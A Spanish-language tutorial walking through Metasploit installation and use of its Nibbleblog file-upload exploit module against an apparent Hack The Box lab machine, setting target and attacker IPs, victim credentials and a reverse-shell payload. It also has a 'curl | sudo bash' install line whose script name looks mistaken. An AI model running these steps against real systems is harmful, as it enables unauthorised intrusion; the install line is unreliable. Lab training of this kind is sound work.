# Metasploit Framework - Explotación de Nibbleblog

### Exención de responsabilidad

Este contenido tiene fines educativos y está diseñado para ser utilizado únicamente en entornos controlados y con permisos explícitos.
Hack The Box y otras plataformas similares proporcionan entornos de práctica legalmente autorizados, y se debe asegurar que se cuenta con los permisos adecuados antes de realizar cualquier prueba de penetración o hacking ético.

El autor de esta publicación no se responsabiliza por el uso indebido de las técnicas y herramientas descritas fuera de los entornos legales y éticos correspondientes.

---

## Índice

1. [Usos y consideraciones de Metasploit Framework](#usos-y-consideraciones-de-metasploit-framework)
2. [Descargar Metasploit Framework](#descargar-metasploit-framework)
3. [Uso de Metasploit Framework](#uso-de-metasploit-framework)


## Usos y consideraciones de Metasploit Framework

Metasploit es una herramienta de código abierto utilizada por profesionales de seguridad para probar la robustez de las redes y sistemas mediante la explotación de vulnerabilidades conocidas.

---

### 1. Descargar Metasploit Framework

#### A) Web oficial

https://www.metasploit.com/

	- Acude a la página oficial de la herramienta y descarga la versión 'Open source'.

#### B) En Linux usando terminal 

##### B.1. Instalar dependencias

Primero, asegúrate de tener las dependencias necesarias.
Si estás en Ubuntu/Debian puedes instalar las dependencias con:

```bash
sudo apt update
sudo apt install curl wget git build-essential libssl-dev libpq-dev libreadline-dev libpcap-dev libsqlite3-dev
```

##### B.2. Instalar Metasploit Framework

Puedes instalar Metasploit Framework usando el script de instalación proporcionado por el proyecto rapid7 o desde los repositorios oficiales.

### Método 1: Usar el script de instalación (recomendado) 

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfvenom-installer.sh | sudo bash
```

### Método 2: Usar apt (si está disponible en los repositorios)

```bash 
sudo apt install metasploit-framework
```

### 2. Uso de Metasploit Framework

#### 2.1. Ejecutar Metasploit Framework

```bash
msfconsole
```

Esto debe de abrir la consola interactiva de Metasploit (msfconsole), donde puedes empezar a usar la herramienta.

![Captura de pantalla](herramientas/metaesploit/imagenes/msfconsole.png)

#### 2.2. Buscar módulos de exploits

Para buscar exploit disponibles usamos el comando 'search' seguido de la vulnerabilidad/servicio a explotar. Vemos dos ejemplos para Wordpress y Nibbleblog

```bash
search Wordpress
```

```bash
search Nibbleblog
```

![Captura de pantalla](herramientas/metaesploit/imagenes/search.png)

#### 2.3. Seleccionar un exploit

Para usar un exploit específico, primero debes seleccionarlo con el comando `use`
 
```bash
use 0
```

```bash
use exploit/multi/http/nibbleblog_file_upload
```
Dos formas válidas de seleccionar un exploit (el nº 0 hace referencia al índice del exploit, miestras que la segunda forma es nombrando la ruta absoluta del exploit)

![Captura de pantalla](herramientas/metaesploit/imagenes/use.png)

#### 2.4. Ver los parámetros del exploit

Cuando seleccionas un exploit, tienes que ver los parámetros necesarios (como la dirección IP de la víctima, puertos, etc.) con `show options`:

##### 2.4.1 Parámetros del Exploit

- **RHOST**: Dirección IP del objetivo.
- **LHOST**: Dirección IP de la máquina atacante (tu propia máquina).
- **LPORT**: Puerto de escucha para la conexión reversa.
- **targeturi**: Especifica la ruta del servicio web que vamos a explotar, en este caso, `nibbleblog` (por defecto o nombre de directorio).


```bash
show options
```

![Captura de pantalla](herramientas/metaesploit/imagenes/show_options.png)
	
#### 2.5. Configurar los parámetros del exploit

Configuramos cada parametro que este marcado como 'yes' con el comando `set`

Establecemos la opción 'rhosts' como la dirección IP de destino (IP víctima)

```bash
set RHOST 10.129.126.4
```

Establecemos la opción 'lhosts' como la dirección IP atacante (en HTB usar la IP tun0 propia de la VPN)

```bash
set LHOST 10.10.12.4
```

Establecemos la opción 'username' con el nombre de usuario de la víctima (obviamente requiere de su conocimiento, bien por ser proporcionada o por extracción) 

```bash
set username admin
```

Establecemos la opción 'password' con la contraseña de usuario de la víctima (obviamente requiere de su conocimiento, bien por ser proporcionada o por extracción) 

```bash
set password <contraseña_de_usuario>
```

[!] Cambiar <contraseña_de_usuario> por la correcta de Nibbleblog (para este caso)

Establecemos la opción 'targeturi' con el nombre del servicio a explotar

```bash
set targeturi nibbleblog
```

Una vez, configuradas las distintas opciones señaladas como necesarias (como 'yes') podemos comprobar los cambios usando de nuevo `show options`

#### 2.6. Configurar parámetros de payload (o carga útil)

Cada exploit requiere de un payload, para ver los disponibles podemos usar el comando `show payloads`
 
```bash
show payloads
```

![Captura de pantalla](herramientas/metaesploit/imagenes/show_payloads.png)

#### 2.7. Seleccionar un payload

Para usar un payload específico, primero debes seleccionarlo con el comando `use`
 
```bash
use payload 4
```

```bash
use payload generic/shell_reverse_tcp
```
Dos formas válidas de seleccionar un payload (el nº 4 hace referencia al índice del payload, miestras que la segunda forma es nombrando la ruta absoluta del exploit)

Puedes ver la información sobre el payload con el comando `info`

```bash
info generic/shell_reverse_tcp
```

[!] Importante revisar de nuevo `show options` para verificar la configuración

#### 2.8. Ejecutar exploit

Para ejecutar el exploit seleccionado y configurado podemos usar los comandos `run` o `exploit`
 
```bash
run
```

```bash
exploit
```

Despues de ejecutar el exploit, deberíamos de obtener (para este caso) una shell reversa. A partir de aquí sería continuar con la explotación en el grado que se requiera (por ejemplo elevando privilegios)

## Consideraciones Éticas y Legales

Esta documentación se proporciona **exclusivamente con fines educativos**.
Las técnicas y procedimientos descritos están diseñados para ser aplicados en **entornos controlados**, como laboratorios personales o plataformas de formación como Hack The Box.

⚠ **IMPORTANTE:**  
El uso indebido de estos conocimientos en sistemas sin autorización constituye una violación de la ley y puede acarrear consecuencias legales graves.  
Antes de realizar cualquier prueba de seguridad, asegúrate de contar con el **consentimiento expreso** del propietario del sistema.

### Asegúrate de:
- Realizar pruebas solo en máquinas y entornos de **pruebas de penetración legal**.
- Nunca realizar pruebas en sistemas sin tener **permiso explícito** para hacerlo.

Para más información sobre prácticas de hacking ético, puedes revisar los términos y condiciones de Hack The Box en:  
🔗 [https://www.hackthebox.com/terms](https://www.hackthebox.com/terms)  
